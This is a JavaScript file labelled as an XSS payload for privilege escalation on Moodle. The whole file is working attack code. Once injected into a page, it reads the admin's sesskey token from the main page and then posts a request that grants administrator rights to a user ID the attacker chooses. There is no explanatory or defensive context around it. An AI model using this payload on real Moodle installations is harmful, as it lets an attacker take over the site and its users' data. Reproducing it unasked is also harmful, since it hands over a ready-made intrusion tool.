// XSS Payload for privilege escalation on Moodle. Change userid value to your userid.

var webroot = '/';
var userid = '3';
var sesskey = '';

function get(path, success) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', webroot + path);
    xhr.onreadystatechange = function() {
        if (xhr.readyState > 3 && xhr.status == 200) {
            success(xhr.responseText);
        }
    };
    xhr.send();
    return xhr;
}

function post(path, data, success) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', webroot + path);
    xhr.onreadystatechange = function() {
        if (xhr.readyState > 3 && xhr.status == 200) {
            success(xhr.responseText);
        }
    };
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(encodeURI(data));
    return xhr;
}

function setAdmin() {
    // Assign administrator access to userid
    bpath = 'admin/roles/admins.php';
    data = "confirmadd=" + userid + "&sesskey=" + sesskey;
    post(bpath, data, function(data){});
}

function getSesskey(data) {
    var sesskey_find = data.indexOf('"sesskey":"');
    sesskey = data.substr(sesskey_find + 11, 10);
    setAdmin();
}

function payload() {
    // We can find Sesskey inside JS script in main page
    get('', getSesskey);
}

// Start
payload();
